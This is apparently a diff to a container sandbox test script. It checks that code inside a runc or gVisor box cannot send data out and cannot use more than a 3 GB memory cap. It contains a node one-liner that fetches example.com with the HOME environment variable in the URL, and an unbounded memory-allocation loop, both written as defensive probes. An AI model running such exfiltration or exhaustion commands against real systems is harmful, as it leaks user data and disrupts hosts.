@@ -41,9 +41,16 @@ try {
   const exfil = await box.exec(`node -e "fetch('https://example.com/?k=' + process.env.HOME).then(() => process.exit(0), () => process.exit(1))"`, { timeoutMs: 20_000 });
   check('a script cannot send data out (fetch to example.com)', exfil.code !== 0);
 
-  const mem = await box.exec(`node -e "const a = []; for (;;) a.push(Buffer.alloc(256 * 1024 * 1024, 1))"`, { timeoutMs: 60_000 });
+  // The loop prints how many MB it holds after each 256 MB block, so the check can tell "killed at the
+  // cap" from "killed by something else". runc's OOM killer gives exit 137; gVisor kills the process
+  // inside its own kernel and docker exec reports other codes, so under runsc the check accepts any
+  // non-zero exit that came before the timeout with the last report at or under the 3 GB cap.
+  const mem = await box.exec(`node -e "const a = []; for (;;) { a.push(Buffer.alloc(256 * 1024 * 1024, 1)); console.log(a.length * 256) }"`, { timeoutMs: 60_000 });
   const oom = (await run('docker', ['inspect', '-f', '{{.State.OOMKilled}} {{.State.Running}}', box.name])).stdout.trim();
-  check('memory is capped (allocation loop is killed)', mem.code === 137, `exit ${mem.code}, container ${oom.endsWith('true') ? 'still running' : 'stopped'}`);
+  const heldMb = Number(mem.stdout.trim().split('\n').pop()) || 0;
+  const capMb = 3 * 1024;
+  const killed = mem.code === 137 || (runtime === 'runsc' && mem.code !== 0 && !mem.timedOut && heldMb <= capMb);
+  check('memory is capped (allocation loop is killed)', killed, `exit ${mem.code}${mem.timedOut ? ' (timed out)' : ''}, held ${heldMb} MB of the ${capMb} MB cap when it stopped, container ${oom.endsWith('true') ? 'still running' : 'stopped'}`);
 } finally {
   await box.destroy();
 }
